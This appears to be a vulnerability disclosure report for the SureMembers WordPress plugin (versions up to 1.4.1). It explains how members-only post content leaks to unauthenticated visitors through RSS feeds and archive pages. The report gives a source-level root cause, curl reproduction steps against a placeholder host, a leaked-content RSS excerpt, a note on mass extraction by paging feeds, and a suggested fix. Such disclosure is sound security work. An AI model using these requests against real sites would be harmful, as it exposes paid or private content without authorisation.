# Unauthenticated content-restriction bypass via feeds/archivesSureMembers (suremembers-core) \<= 1.4.1

https://suremembers.com/

| Field | Value |
| :---- | :---- |
| **Component type** | WordPress Plugin |
| **Component slug** | `suremembers-core` |
| **Component link** | [https\://wordpress.org/plugins/suremembers-core/](https://wordpress.org/plugins/suremembers-core/) |
| **Prefix** | `<=` |
| **Affected version(s)** | 1.4.1 |
| **Pre-requisite** | Unauthenticated |
| **OWASP 2021 class** | A01: Broken Access Control |
| **OWASP 2021 type** | Broken Access Control |
| **Suggested CVSS 3.1** | 7.5 — `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` |

---

## Vulnerability description

SureMembers is a membership / content-restriction plugin: a site owner creates a Membership (internally an "access group") and selects posts, pages or custom post types that only members of that group may read. Non-members are meant to see either a custom message ("preview") or be redirected elsewhere.

The plugin enforces restrictions in only two places:

1. **`template_redirect` (inc/template-redirect.php, `Template_Redirect::processed_content()`)**. This evaluates the rules for the single global `$post` only. On archive, home and feed requests, `Restricted::get_current_content_type()` returns an archive/home page type, so per-post rules (`post-{ID}-|`) are never matched for the posts in the loop.  
2. **`Rules_Engine::search_result()` on `posts_results` (admin/rules-engine.php)**. This is the only loop-level filter that blanks the content of restricted posts. It runs only when `should_restrict_post_in_loop()` returns true, which requires **both** `is_search()` **and** the optional `enable_search_restriction` setting.

REST API requests are handled separately (inc/rest-restriction.php) and are correctly blocked.

As a result, for every query that is not a singular view, a REST request or an opted-in search, the restricted posts' full `post_content` passes through `the_content` unmodified. This includes:

- RSS feeds — verified: `/?feed=rss2` (paged), `/?cat=1&feed=rss2`, `/?m=YYYYMMDD&feed=rss2`  
- Archive pages — verified: date archive `/?m=YYYYMMDD`  
- Other archive/feed types (tag, author, Atom, pretty-permalink `/feed/`) go through the same non-singular code path and are expected to behave identically

Any unauthenticated visitor can read the full body of every members-only post by requesting it through a feed or archive URL instead of its permalink. Feeds are especially severe: `content:encoded` always contains the full rendered body regardless of theme, and feeds are publicly linked from every page (`<link rel="alternate" type="application/rss+xml">`).

Both Unauthorized Access behaviours tested (custom restriction message, and Redirect) are affected.

---

## How to reproduce

**Environment:** a fresh WordPress install (tested on the latest WordPress, PHP 8.3, default Twenty Twenty-Five theme) with SureMembers (`suremembers-core`) 1.4.1 active and default settings.

### Setup (as site administrator, normal plugin UI)

1. Create a post titled **"Members Only Report"** with the content `SECRET-MEMBERS-ONLY-CONTENT-7f3a`, and publish it. In this test it is post ID **21**, published on **2026-10-01**.  
2. Go to **SureMembers → Memberships → Create Membership** and create a membership named "Gold Members":  
   - Under **Protected Content**, select the specific post "Members Only Report".  
   - Under **Unauthorized Access**, choose to show a custom restriction message, for example `This content is for Gold Members only.` The result is the same with **Redirect** and a Redirect URL.  
   - Save / publish the membership.

### Attack (unauthenticated, no cookies)

3. **Control: the permalink is correctly protected.**

```
$ curl -s "http://TARGET/?p=21" | grep -o "Gold Members only\|SECRET-MEMBERS-ONLY-CONTENT-7f3a"
Gold Members only
```

(With the "Redirect" action, this instead returns `HTTP/1.1 302 Found` to the configured URL.)

4. **Control: the REST API is correctly protected.**

```
$ curl -s "http://TARGET/?rest_route=/wp/v2/posts/21"
{"code":"suremembers_rest_forbidden","message":"Sorry, you are not allowed to view this content.","data":{"status":401}}
```

5. **Bypass \#1 – RSS feed.** Request any feed that contains the post. The plain site feed `/?feed=rss2` works whenever the post is among the latest items; a date-scoped feed targets it deterministically:

```
$ curl -s "http://TARGET/?m=20261001&feed=rss2"
```

Response (excerpt):

```xml
<item>
    <title>Members Only Report</title>
    <link>http://TARGET/?p=21</link>
    <pubDate>Thu, 01 Oct 2026 10:00:00 +0000</pubDate>
    <guid isPermaLink="false">http://TARGET/?p=21</guid>
    <description><![CDATA[SECRET-MEMBERS-ONLY-CONTENT-7f3a]]></description>
    <content:encoded><![CDATA[<p>SECRET-MEMBERS-ONLY-CONTENT-7f3a</p>
]]></content:encoded>
</item>
```

The full restricted body is disclosed in both `<description>` and `<content:encoded>`. The same leak was verified with `/?feed=rss2&paged=2` and `/?cat=1&feed=rss2&paged=2`.

6. **Bypass \#2 – archive page.**

```
$ curl -s "http://TARGET/?m=20261001" | grep -o "SECRET-MEMBERS-ONLY-CONTENT-7f3a"
SECRET-MEMBERS-ONLY-CONTENT-7f3a
```

The date archive renders the restricted post's full content (see screenshot `2-date-archive-leak.png`).

**Mass extraction:** an attacker can page through `/?feed=rss2&paged=1..N` to dump the full content of every restricted post on the site, unauthenticated, in a few requests.

---

## Impact

The plugin's core security guarantee, that restricted content is visible only to members of the configured Membership, can be bypassed completely by any unauthenticated visitor. Every post protected through SureMembers can be read in full via RSS feeds or archive pages, including paid or members-only articles, courses, internal documents and so on.

No account, nonce, special header or user interaction is required, and the leaking URLs (feeds) are advertised by WordPress itself on every page. For sites that monetise memberships, this exposes all paid content to the public and to feed aggregators and search-engine crawlers.

---

## Additional information

**Root cause**

- `inc/template-redirect.php`: restriction is applied only to the single global `$post` during `template_redirect`, so loop items on feeds and archives are never evaluated.  
- `admin/rules-engine.php`: `search_result()` and `should_restrict_post_in_loop()` filter loop posts only when `is_search()` is true **and** `enable_search_restriction` is enabled; feeds, archives and the home page are never filtered.

**Suggested fix** Apply `Rules_Engine::unrestricted_posts()`, which already exists and correctly replaces the content with the "loop content" message, to every non-admin front-end main query, not only opted-in searches. That covers `is_feed()`, `is_archive()`, `is_home()` and `is_search()`. Alternatively, filter `the_content`, `the_excerpt`, `the_content_feed` and `the_excerpt_rss` per post using `Restricted::is_restricted_for_user( get_the_ID() )`.



https://github.com/user-attachments/assets/3598e390-86d9-4716-83b6-f752dbc9e155

<img width="1600" height="1000" alt="shot1_control_permalink" src="https://github.com/user-attachments/assets/f60262c1-c3c7-4407-895a-309a466edad5" />

<img width="1600" height="1000" alt="shot2_date_archive_leak_full" src="https://github.com/user-attachments/assets/15b024b2-420f-4cde-8a1d-893ab4ff9781" />

<img width="1600" height="1000" alt="shot3_rss_feed_leak_raw_xml" src="https://github.com/user-attachments/assets/c8e8d8c9-1004-4318-b966-c5dab6cb3262" />

## Disclosure
 - 30 Oct 2026 - reported to Wordfence (#482174) - but "Missing Auth" is out of scope:
   <img width="381" height="386" alt="image" src="https://github.com/user-attachments/assets/cdf1677f-f82f-40ef-a9d1-c5866f2a0579" />


